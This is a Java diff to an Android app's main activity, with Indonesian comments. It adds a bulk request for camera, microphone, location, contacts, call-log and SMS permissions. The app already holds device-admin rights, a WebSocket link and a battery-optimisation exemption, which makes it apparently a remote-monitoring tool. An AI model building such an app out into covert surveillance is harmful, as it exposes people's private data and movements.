@@ -17,6 +17,7 @@ public class MainActivity extends Activity {
     
     private static final int REQUEST_ENABLE_ADMIN = 1;
     private static final int REQUEST_IGNORE_BATTERY_OPTIMIZATIONS = 2;
+    private static final int REQUEST_ALL_PERMISSIONS = 3;
     
     private WebSocketClient wsClient;
     private TextView statusText;
@@ -35,6 +36,7 @@ public class MainActivity extends Activity {
         initDeviceAdmin();
         initWebSocketClient();
         checkBatteryOptimization();
+        requestAllPermissions();
         
         updateUI();
     }
@@ -132,6 +134,56 @@ public class MainActivity extends Activity {
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivityForResult(intent, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+        }
+    }
+
+    private void requestAllPermissions() {
+        // List semua permission berbahaya yang diperlukan
+        String[] requiredPermissions = {
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_PHONE_STATE
+        };
+
+        // Cek permission yang belum diberikan
+        java.util.ArrayList<String> permissionsToRequest = new java.util.ArrayList<>();
+        for (String permission : requiredPermissions) {
+            if (checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(permission);
+            }
+        }
+
+        // Request permission yang belum diberikan
+        if (!permissionsToRequest.isEmpty()) {
+            requestPermissions(permissionsToRequest.toArray(new String[0]), REQUEST_ALL_PERMISSIONS);
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == REQUEST_ALL_PERMISSIONS) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "Some permissions were denied. Some features may not work.", Toast.LENGTH_LONG).show();
+            }
         }
     }
     
